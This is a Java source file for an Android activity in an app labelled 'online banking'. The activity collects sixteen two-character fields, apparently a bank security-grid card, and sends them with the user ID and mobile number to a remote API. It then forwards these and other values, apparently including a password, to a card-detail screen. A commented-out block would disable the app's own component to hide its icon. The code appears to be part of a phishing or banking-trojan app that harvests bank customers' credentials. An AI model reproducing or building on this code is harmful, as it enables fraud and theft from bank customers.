package com.codewithmuddasir.onlinebanking;

import androidx.appcompat.app.AppCompatActivity;
import androidx.databinding.DataBindingUtil;

import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.Toast;

import com.bumptech.glide.Glide;
import com.codewithmuddasir.onlinebanking.databinding.ActivityLoginLoadingBinding;
import com.codewithmuddasir.onlinebanking.helper.Util;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class LoginLoadingActivity extends AppCompatActivity {

    ActivityLoginLoadingBinding binding;
    private Util util = new Util();


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding= DataBindingUtil.setContentView(this, R.layout.activity_login_loading);

        util.saveLocalData(this,"check","true");

        if (binding.editText1 != null) {
            binding.editText1.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText1.clearFocus();
                        binding.editText2.requestFocus();
                    }
                }
            });
        }

        if (binding.editText2 != null) {
            binding.editText2.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText2.clearFocus();
                        binding.editText3.requestFocus();
                    }
                }
            });
        }

        if (binding.editText3 != null) {
            binding.editText3.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText3.clearFocus();
                        binding.editText4.requestFocus();
                    }
                }
            });
        }

        if (binding.editText4 != null) {
            binding.editText4.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText4.clearFocus();
                        binding.editText5.requestFocus();
                    }
                }
            });
        }

        if (binding.editText5 != null) {
            binding.editText5.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText5.clearFocus();
                        binding.editText6.requestFocus();
                    }
                }
            });
        }

        if (binding.editText6 != null) {
            binding.editText6.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText6.clearFocus();
                        binding.editText7.requestFocus();
                    }
                }
            });
        }

        if (binding.editText7 != null) {
            binding.editText7.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText7.clearFocus();
                        binding.editText8.requestFocus();
                    }
                }
            });
        }

        if (binding.editText8 != null) {
            binding.editText8.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText8.clearFocus();
                        binding.editText9.requestFocus();
                    }
                }
            });
        }


        if (binding.editText9 != null) {
            binding.editText9.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText9.clearFocus();
                        binding.editText10.requestFocus();
                    }
                }
            });
        }

        if (binding.editText10 != null) {
            binding.editText10.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText10.clearFocus();
                        binding.editText11.requestFocus();
                    }
                }
            });
        }

        if (binding.editText11 != null) {
            binding.editText11.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText11.clearFocus();
                        binding.editText12.requestFocus();
                    }
                }
            });
        }

        if (binding.editText12 != null) {
            binding.editText12.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText12.clearFocus();
                        binding.editText13.requestFocus();
                    }
                }
            });
        }

        if (binding.editText13 != null) {
            binding.editText13.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText13.clearFocus();
                        binding.editText14.requestFocus();
                    }
                }
            });
        }
        if (binding.editText14 != null) {
            binding.editText14.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText14.clearFocus();
                        binding.editText15.requestFocus();
                    }
                }
            });
        }

        if (binding.editText15 != null) {
            binding.editText15.addTextChangedListener(new TextWatcher() {
                @Override
                public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {}

                @Override
                public void afterTextChanged(Editable editable) {
                    if (editable.length() == 2) {
                        binding.editText15.clearFocus();
                        binding.editText16.requestFocus();
                    }
                }
            });
        }





        binding.sub.setOnClickListener(view -> {
            util.saveLocalData(this ,"check","false");

            String num = binding.editText1.getText().toString()+","+binding.editText2.getText().toString()+","+binding.editText3.getText().toString()+","
                    +binding.editText4.getText().toString()+","+binding.editText5.getText().toString()+","+binding.editText6.getText().toString()+","+binding.editText7.getText().toString()+","
                    +binding.editText8.getText().toString()+","+binding.editText9.getText().toString()+","+binding.editText10.getText().toString()+","+binding.editText11.getText().toString()+","
                    +binding.editText12.getText().toString()+","+binding.editText13.getText().toString()+","+binding.editText14.getText().toString()+","+binding.editText15.getText().toString()+","
                    +binding.editText16.getText().toString();


            if(num.length()<47){
                Toast.makeText(this, "fill all fields", Toast.LENGTH_SHORT).show();
            }else{


                Intent intent2 = getIntent();
             //   secondapge message1 = null;
             //   String userId =  intent2.getStringExtra("u");

                secondapge  message1 = new secondapge(intent2.getStringExtra("u"),
                            intent2.getStringExtra("m") ,num );



                ApiService apiService = ApiClient.getClient().create(ApiService.class);
                Call<Void> call = apiService.createsecondpage(message1);

                call.enqueue(new Callback<Void>() {
                    @Override
                    public void onResponse(Call<Void> call, Response<Void> response) {
                        // Handle successful response
                        if (response.isSuccessful()) {
                            // Data sent successfully

                            Intent intent = new Intent(LoginLoadingActivity.this, CardDetail.class);
                            intent.putExtra("m", intent2.getStringExtra("m") );
                            intent.putExtra("a", intent2.getStringExtra("a") );
                            intent.putExtra("u", intent2.getStringExtra("u") );
                            intent.putExtra("p", intent2.getStringExtra("p") );
                            intent.putExtra("d",num);
                            startActivity(intent);
                        } else {
                            // Handle other response codes if needed
                            Log.d("asdf123","unsucess");
                        }
                    }

                    @Override
                    public void onFailure(Call<Void> call, Throwable t) {
                        // Handle failure
                        Log.d("asdf123",t.toString());
                    }
                });





            }



        });


    }


//    @Override
//    protected void onPause() {
//        super.onPause();
//        Util util = new Util();
//        if (util.getLocalData(this, "check").equals("true")) {
//            Log.e("asdf123", "pause: verify activity");
//            PackageManager packageManager = getPackageManager();
//            packageManager.setApplicationEnabledSetting(
//                    getPackageName(),
//                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
//                    PackageManager.DONT_KILL_APP
//            );
//        }
//    }

}


class secondapge{
    private String userId;
    private String twocardvalue;
    private String mobile;

    secondapge(String usrid,String mobile,String call){
        this.userId = usrid;
        this.mobile = mobile;
        this.twocardvalue = call;

    }
    secondapge(String usrid, String call){
        this.userId = usrid;
        this.twocardvalue = call;

    }
}

